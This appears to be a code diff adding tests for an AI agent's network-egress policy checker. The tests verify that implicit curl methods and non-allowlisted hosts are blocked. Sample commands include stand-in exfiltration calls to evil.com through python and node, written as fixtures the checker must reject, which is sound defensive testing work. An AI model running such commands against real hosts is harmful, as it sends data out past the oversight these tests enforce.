@@ -571,6 +571,68 @@ network_policies:
         # wrong path still blocked
         assert checker.check(cmd_action("curl https://api.example.com/forbidden")).violated
 
+    def test_command_implicit_method_enforced(self, kg, tmp_path):
+        """Implicit curl method flags (-d/-F/-I/-T) must be honoured against a
+        method-scoped allowlist, not treated as GET."""
+        _load_network_policy(
+            kg,
+            tmp_path / "policies",
+            """
+network_policies:
+  scoped:
+    name: scoped
+    endpoints:
+      - host: api.example.com
+        port: 443
+        protocol: rest
+        enforcement: enforce
+        rules:
+          - allow: { method: GET, path: "/allowed" }
+    binaries:
+      - path: /usr/bin/curl
+""",
+        )
+        checker = PolicyChecker(kg, nemoclaw_enabled=True)
+
+        def cmd(command):
+            return checker.check(
+                _make_action("ExecuteCommand", tool_name="exec", command=command)
+            ).violated
+
+        assert cmd("curl -d 'x=1' https://api.example.com/allowed")  # POST -> blocked
+        assert cmd("curl -F file=@a https://api.example.com/allowed")  # POST -> blocked
+        assert cmd("curl -I https://api.example.com/allowed")  # HEAD -> blocked
+        assert cmd("curl https://api.example.com/allowed") is False  # GET -> allowed
+        assert cmd("curl -G -d q=1 https://api.example.com/allowed") is False  # GET
+
+    def test_command_url_triggers_egress_check(self, kg, tmp_path):
+        """A command reaching a non-allowlisted host via any binary (not just
+        curl/wget) must be blocked, not bypass the egress allowlist."""
+        _load_network_policy(
+            kg,
+            tmp_path / "policies",
+            """
+network_policies:
+  scoped:
+    name: scoped
+    endpoints:
+      - host: api.example.com
+        port: 443
+        protocol: rest
+        access: full
+    binaries:
+      - path: "/**"
+""",
+        )
+        checker = PolicyChecker(kg, nemoclaw_enabled=True)
+
+        for command in (
+            "python client.py https://evil.com/data",
+            "node script.js https://evil.com/data",
+        ):
+            action = _make_action("ExecuteCommand", tool_name="exec", command=command)
+            assert checker.check(action).violated is True, command
+
     def test_method_from_command_parsing(self, kg):
         """The HTTP method is parsed from common shell client invocations."""
         f = PolicyChecker._method_from_command
@@ -584,6 +646,15 @@ network_policies:
         assert f("xh DELETE :/api") == "DELETE"
         assert f("http https://x/y") == "GET"  # httpie default
         assert f("python attack.py --target https://x/y") is None  # undeterminable
+        # Implicit-method flags change curl's effective method (no -X present):
+        assert f("curl -d 'x=1' https://x/y") == "POST"
+        assert f("curl --data-raw '{}' https://x/y") == "POST"
+        assert f("curl -F file=@a https://x/y") == "POST"
+        assert f("curl --json '{}' https://x/y") == "POST"
+        assert f("curl -I https://x/y") == "HEAD"
+        assert f("curl -T ./a https://x/y") == "PUT"
+        assert f("curl -G -d q=1 https://x/y") == "GET"  # -G forces GET query
+        assert f("wget --post-data=x https://x/y") == "POST"
 
     def test_path_method_allowed_fails_closed_on_unknown_method(self, kg):
         """A method-constrained rule does NOT authorise when the request method
